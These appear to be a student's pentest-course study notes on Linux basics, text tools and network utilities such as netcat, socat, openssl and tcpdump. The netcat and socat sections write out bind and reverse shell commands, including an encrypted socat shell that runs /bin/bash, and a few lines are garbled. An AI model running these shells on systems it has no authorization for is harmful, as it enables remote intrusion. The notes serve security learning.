passwd- to change password

whoami - to show privelege level

/bin - basic programs (ls, cd, cat, etc.)

/sbin - system programs (fdisk, mkfs, sysctl, etc)

/etc - configuration files

/tmp - temporary files (typically deleted on boot)

/usr/bin - applications (apt, ncat, nmap, etc.)

/usr/share - application support and data files

man - to see manual of a tool

man -k passwd - -k to search for a specific tool

man -k ^passwd$^ - here ^ ^ is to match entire line and $ to prevent substring matches

apropos keyword - helps to search description of man page

ls -al - a is to show hidden files aswell

pwd - to show the current directory

which - searches through directories for path environment

locate - to locate

find / -name sbd* - to find names starting with sbd ( benifits over locate as more filters)

apt-cache search displays info about internal cached package database

apt remove --purge - purge removes everything

dpkg - it is a tool to directly install .debian packages

echo $APATH - shows path environment variable

echo $USER

echo $PWD - present working directory

echo $HOME - home directory

we can also define path using export

export b = 10.10.10.1 - this allows us to repeatedly refer to the ip adress without writing it again and again

echo "$$" - to show process id

env - see default env variables by using env

history - to check bash history and then preceeded by      !1 or any other option

!! - shows last command executed

## piping and redirection

every command run has 3 streams.
STDIN   filedescriptor 0
STDOUT  1
STDERR  2

piping using | or < or > connects these streams between programs

command > text.txt

to append to an existing file(add data)

command >> text.txt

we can also redirect from a file

wc -m < redirect.txt

ls ./test>error.txt - to redirect the error


## grep

ls -la /usr/bin | grep zip
here we piped two commands together

grep has -r for recursive searching and -i to ignore text case

## sed 

sed is stream edior
echo "this is og stf here" | sed 's/stf/stuff'
> this is og stuff here

## cut 
a simple command used to extract sections of text -f for field no. we are cutting -d for field delimeter

e.g. 
kali@kali:~$ echo "I hack binaries,web apps,mobile apps, and just about anything else"
| cut -f 2 -d ","

web apps

kali@kali:~$ cut -d ":" -f 1 /etc/passwd

>root

>daemon

>bin

here a list users is extracted from /etc/passwd

## awk

awk is a programming language for text processing

echo "hello::there::friend" | awk3-F "::" '{print $1, $3}'
> hello friend

## head 
displays first 10 lines

## wc 
with -l displays the no. of lines

## nano

my favourite tool lmao 

## vi
dd- delete current line

yy- copy current line

p - to paste clipboard

x - delete current char

:w to write to a file

:q! quit without writing to disk

:wq save and quit

## comm
 to compare two text files
 easy interface
 
## diff
same as comm but much more complex

-c include context format

-u unified format

```
kali@kali:~$ diff -c scan-a.txt scan-b.txt
*** scan-a.txt 2018-02-07 14:46:21.557861848 -0700
--- scan-b.txt 2018-02-07 14:46:44.275002421 -0700
***************
*** 1,5 ****
192.168.1.1
- 192.168.1.2
192.168.1.3
192.168.1.4
192.168.1.5
--- 1,5 ----
192.168.1.1
192.168.1.3
192.168.1.4
192.168.1.5
+ 192.168.1.6
kali@kali:~$ diff -u scan-a.txt scan-b.txt
--- scan-a.txt 2018-02-07 14:46:21.557861848 -0700
+++ scan-b.txt 2018-02-07 14:46:44.275002421 -0700
@@ -1,5 +1,5 @@
192.168.1.1
-192.168.1.2
192.168.1.3
192.168.1.4
192.168.1.5
+192.168.1.6
```
 
 ## vimdiff
 
 opens vim in different tbas for multiple files
 
 vimdiff a.txt b.txt
 
 ## backgrounding a process
 $ after a command immediately backgrounds the process
 
 ## jobs
 
 lists current jobs running in the current terminal
 
 ## fg 
 
 returns a process to foreground
 First, the odd ^C character represents the keystroke combination
. We can use this shortcut
to terminate a long-running process and regain control of the terminal.
C c
Second, the use of “%1” in the fg %1 command is new. There are various ways to refer to a job in
the shell. The “%” character followed by a JobID represents a job specification.

## ps and kill

process status and kill
 
 ```
 kali@kali:~$ ps -ef
UID       PID         PPID C STIME TTY    TIME CMD
root        1             0 0 10:18 ?    00:00:02 /sbin/init
...
Listing 62 Common ps syntax to list all the processes currently running
The -ef 73 options we used above stand for:
• e : select all processes
• f : display full format listing (UID, PID, PPID, etc.)
Finding our Leafpad application in that massive listing is definitely not easy, but since we know the
application name we are looking for, we can replace the -e switch with -C (select by command
name) as follows:
kali@kali:~$ ps -fC leafpad
UID       PID     PPID C STIME TTY  TIME CMD
kali      1307     938 0 10:57 ?    00:00:00 leafpad
 ```
 
 
 kill 1307 to stop leafpad
 
 
# file and command monitoring

## tail

to monitor log entries as they are being written
For example,
we may want to monitor the Apache logs to see if a web server is being contacted by a given client
we are attempting to attack via a client-side exploit. This example will do just that:
kali@kali:~$ sudo tail -f /var/log/apache2/access.log

The -f option (follow) is very useful as it continuously updates the output as the target file grows.
Another convenient switch is -nX , which outputs the last “X” number of lines, instead of the default
value of 10.

## wget and curl
-o command to save destination with diff.. name

## axel
it is a download accelarator to transfer files from ftp or http server

## bash 
modify bash behaviour
The behavior of interactive shells in Bash is determined by the system-wide bashrc file located in
/etc/bash.bashrc. The system-wide Bash settings can be overridden by editing the .bashrc file
located in any user’s home directory.

# practical tools

## Netcat
-n to check if the port is open
-v for verbose
 
 listening:
 
 nc -nlvp 4444 here -n is to disable DNS name resolution -l to listen -v verbose and -p for port
 
 to send files:
 
 nc -nlvp > incoming.exe
 
 nc -nv :address: :port: < send.exe
 
 ## Remote Administration with Netcat
 
 nc -nlvp 4444 -e cmd.exe -to bind shell to netcat
 
 ## reverse shell
 
 nc -nlvp 4444
 
 nc -nv :address: :port: -e /bin/bash


## socat 

For penetration testing, it is similar to Netcat but has additional useful features.

```
kali@kali:~$ nc <remote server's ip address> 80
kali@kali:~$ socat - TCP4:<remote server's ip address>:80
```
Because root privileges are required to bind a listener to ports below 1024, we need to use sudo
when starting a listener on port 443:
```
kali@kali:~$ sudo nc -lvp localhost 443
kali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT
```
Alice’s host
machine is running on Linux, and Bob’s is running Windows.

On Alice’s side, we will share the file on port 443. In this example, the TCP4-LISTEN option specifies
an IPv4 listener, fork creates a child process once a connection is made to the listener, which
allows multiple connections, and file: specifies the name of a file to be transferred:

kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt

On Bob’s side, we will connect to Alice’s computer and retrieve the file. In this example, the TCP4
option specifies IPv4, followed by Alice’s IP address ( 10.11.0.4 ) and listening port number ( 443 ),
file: specifies the local file name to save the file to on Bob’s computer, and create specifies that
a new file will be created:

C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create

## openssl

to create ssl certificates
-req initiate signing of a new certi

-newkey generate new private key

rsa:2048 use RSA encryption with 2048-bit key length

-nodes: store private key without pass phrase protection

-keyout save the key to a file 

-x509 output a self signed certificate instead of certi request

-days set validity

-out save the cert to a file 

>openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt

# encryted socat shell

use above certi adn private key adn combine it into a single file
>cat bind_shell.key bind_shell.crt > bind_shell.pem

now

sudo socat OPENSSL_LISTEN:443, cert=binds_shell.pem,verify=0, fork EXEC:/bin/bash

in windows

socat - OPENSSL:address, verify=0

## powercat

netcat version of powershell
aptget install powercat

## tcpdump

to read traffic
sudo tcpdump -r passwordcracking.pcap

to filter content use option like -n to skip DNS lookups adn -r to read from packet capture file then pipe the output through awk and then pipe it again to sort and uniq -c to sort and count the no. of times a field appeard in packet capture

sudo tcpdump -n - r x.pcap | awk -F" " '{print $3}' | sort | uniq -c | head

In order to filter from the command line, we will use the source host ( src host ) and destination
host ( dst host ) filters to output only source and destination traffic respectively. We can also filter
by port number ( -n port 81 ) to show both source and destination traffic against port 81. Let’s try
those filters now

examples

```
sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap

```

To dump the captured traffic, we will use the -X option to print the packet data in both HEX and
ASCII 108 format:
sudo tcpdump -nX -r password_cracking_filtered.pcap
